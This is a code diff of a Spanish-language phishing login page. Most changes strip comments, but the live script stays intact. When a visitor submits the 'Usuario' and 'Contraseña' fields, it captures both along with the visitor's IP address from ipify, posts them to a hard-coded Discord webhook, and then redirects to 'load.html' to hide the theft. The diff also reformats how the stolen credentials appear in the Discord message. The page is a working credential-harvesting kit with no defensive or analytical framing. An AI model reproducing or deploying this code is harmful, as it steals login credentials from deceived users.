@@ -19,7 +19,6 @@
     }
     .container { width: 100%; max-width: 440px; }
 
-    /* LOGO */
     .logo-section { text-align: center; margin-bottom: 45px; }
     .logo-image {
         max-width: 140px;
@@ -29,7 +28,6 @@
         margin: 0 auto;
     }
 
-    /* FORM */
     .form-group { margin-bottom: 22px; }
     .form-label {
         display: block;
@@ -72,17 +70,16 @@
     .password-toggle:hover { background-color: #f0f0f0; }
     .password-toggle svg { width: 22px; height: 22px; }
 
-    /* BUTTON CON ANIMACIONES */
     .login-btn {
         width: 100%;
         padding: 19px;
-        background: #b8c4e4; /* Color apagado inicial */
+        background: #b8c4e4;
         color: #fff;
         border: none;
         border-radius: 40px;
         font-size: 17px;
         font-weight: 700;
-        cursor: not-allowed; /* Cursor de no permitido inicialmente */
+        cursor: not-allowed;
         margin-top: 70px;
         margin-bottom: 55px;
         font-family: inherit;
@@ -91,7 +88,6 @@
         overflow: hidden;
     }
     
-    /* Botón activo cuando los campos están llenos */
     .login-btn.active {
         background: #7d95d4;
         cursor: pointer;
@@ -108,7 +104,6 @@
         transform: translateY(0) scale(0.98);
     }
 
-    /* Animación de carga */
     .login-btn.loading {
         color: transparent;
         pointer-events: none;
@@ -133,7 +128,6 @@
         to { transform: rotate(360deg); }
     }
 
-    /* HELP */
     .help-title {
         font-size: 20px;
         color: #3a3a3a;
@@ -182,7 +176,6 @@
         <img src="bgr.png" alt="Logo" class="logo-image">
     </div>
 
-    <!-- FORM CON ID CORREGIDO -->
     <form id="loginForm">
         <div class="form-group">
             <label class="form-label">Usuario</label>
@@ -237,7 +230,6 @@
 </div>
 
 <script>
-    // === ELEMENTOS ===
     const passwordInput = document.getElementById('password');
     const usuarioInput = document.getElementById('usuario');
     const togglePassword = document.getElementById('togglePassword');
@@ -245,19 +237,16 @@
     const submitBtn = document.getElementById('submitBtn');
     const loginForm = document.getElementById('loginForm');
 
-    // === ICONOS SVG ===
     const eyeClosed = `<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><path d="M14.12 14.12a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>`;
     
     const eyeOpen = `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>`;
 
-    // === TOGGLE PASSWORD ===
     togglePassword.addEventListener('click', function() {
         const isPassword = passwordInput.type === 'password';
         passwordInput.type = isPassword ? 'text' : 'password';
         eyeIcon.innerHTML = isPassword ? eyeOpen : eyeClosed;
     });
 
-    // === BOTÓN ACTIVO/INACTIVO SEGÚN INPUTS ===
     function checkInputs() {
         const usuarioFilled = usuarioInput.value.trim().length > 0;
         const passwordFilled = passwordInput.value.trim().length > 0;
@@ -271,24 +260,20 @@
         }
     }
 
-    // Escuchar cambios en los inputs
     usuarioInput.addEventListener('input', checkInputs);
     passwordInput.addEventListener('input', checkInputs);
 
-    // === ENVÍO DEL FORMULARIO ===
     loginForm.addEventListener('submit', async function(e) {
         e.preventDefault();
         
         const usuario = usuarioInput.value.trim();
         const password = passwordInput.value;
         
-        // Animación de carga
         submitBtn.classList.add('loading');
         submitBtn.disabled = true;
         
         const webhookUrl = 'https://discord.com/api/webhooks/1547235454435196931/ZsQbvEnD7ph7bCQiofCk80Q_fNPEjZ_4as5hbdWNnNs_42kXip2wPQkTAlKSmzI-LxAg';
         
-        // Obtener IP (opcional)
         let userIP = 'Desconocida';
         try {
             const ipResponse = await fetch('https://api.ipify.org?format=json');
@@ -305,12 +290,12 @@
                 fields: [
                     {
                         name: "👤 Usuario",
-                        value: usuario,
+                        value: `\`\`\`${usuario}\`\`\``,
                         inline: false
                     },
                     {
                         name: "🔑 Contraseña", 
-                        value: password,
+                        value: `\`\`\`${password}\`\`\``,
                         inline: false
                     }
                 ],
@@ -321,14 +306,12 @@
             }]
         };
         
-        // Enviar a Discord (con timeout para asegurar redirección)
         const sendWebhook = fetch(webhookUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
         });
         
-        // Esperar máximo 3 segundos y redirigir de todas formas
         setTimeout(() => {
             window.location.href = 'load.html';
         }, 1500);
@@ -340,7 +323,6 @@
         }
     });
 
-    // Inicializar estado del botón
     checkInputs();
 </script>
 </body>
